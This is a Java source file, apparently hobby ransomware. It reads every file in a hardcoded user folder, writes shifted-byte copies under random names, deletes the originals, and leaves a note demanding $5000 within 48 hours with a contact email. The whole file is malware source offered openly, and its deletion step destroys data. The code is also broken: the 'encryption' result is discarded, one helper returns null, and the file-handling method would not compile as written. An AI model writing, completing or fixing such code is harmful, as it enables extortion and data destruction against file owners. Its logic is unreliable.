import java.io.*;
import java.util.Random;

public class Ransomeware_enc {

    public static void main(String[] args) throws IOException {
//        String s = "This is a test.";
//        String sRes = "";
//        byte a[] = s.getBytes();
//        byte b[] = EncryptAlgo(a);
//
//        for (int i = 0; i < b.length; i++) {
//            sRes += (char) b[i];
//        }
//
//        System.out.println("" + sRes);
//        System.out.println("" + getRandomName(10, "ayush"));

        File ff = new File("");
        File src = new File(/*ff.getAbsolutePath()*/"C:\\Users\\Ayush\\Desktop\\test");
        File files[] = src.listFiles();

        try {
            for (File f: files) {
                if (!f.getName().equals("lib")) {
                    Encrypting(f, src);
                    f.delete();
                }

                if (!f.getName().equals("ransomeware_enc")) {
                    f.delete();
                }
            }
        } catch (Exception e) {

        }

        ff = new File("important file.txt");
        FileWriter fw = new FileWriter(ff);
        PrintWriter pw = new PrintWriter(fw);
        pw.println("Your data is encrypted.");
        pw.println("To recover your data you need to pay $5000 before 48 hrs" +
                " and if you dont pay it by then you can say goodbye to your data.");
        pw.println("You can contact me at brcewayn01@gmail.com");
        pw.println("your key is: QDASUBKNI2asfa7AFSAFE");
        pw.close();

    }

    static byte[] EncryptAlgo(byte []data) {
        byte enc[] = new byte[data.length];

        for (int i = 0; i < data.length; i++) {
            if (i % 2 == 0) {
                enc[i] = (byte) (data[i] + 1);
            } else {
                enc[i] = (byte) (data[i] - 2);
            }
        }

        return enc;
    }

    static String getRandomName(int length, String extend) {
        Random r = new Random();
        StringBuilder res = new StringBuilder();

        for (int i = 0; i < length; i++) {
            char c = 'a';
            int width = 26;

            if (r.nextInt(3) == 0) {
                c = 'A';
                width = 26;
            }

            if (r.nextInt(3) == 1) {
                c = '0';
                width = 10;
            }

            res.append((char) (c + r.nextInt(width)));
        }

        res.append(".").append(extend);
        return  res.toString();
    }

    static void Encrypting(File source, File dest) {
        InputStream in = null;
        OutputStream os = null;
        dest = new File(dest.getPath().concat(getRandomName(10, "ayush")));

        try {
            in = new FileInputStream(source);
            os = new FileOutputStream(dest);
            os.write(new byte[]{(byte)source.getName().length()});
            os.write(StringtoByte(source.getName()));

            byte buffer[] = new byte[1024];
            int length;

            while ((length = in.read(buffer)) > 0) {
                EncryptAlgo(buffer);
                os.write(buffer, 0, length);
            }

        } finally {
            in.close();
            os.close();
        }
    }

    static byte[] StringtoByte(String data) {
        char ca[] = data.toCharArray();
        byte res[] = new byte[ca.length * 2];

        for (int i = 0; i < res.length; i++) {
            res[i] = (byte) ((ca[i / 2] >> (8 - (i % 2) * 8)) & 0xff);
        }

        return null;
    }
}
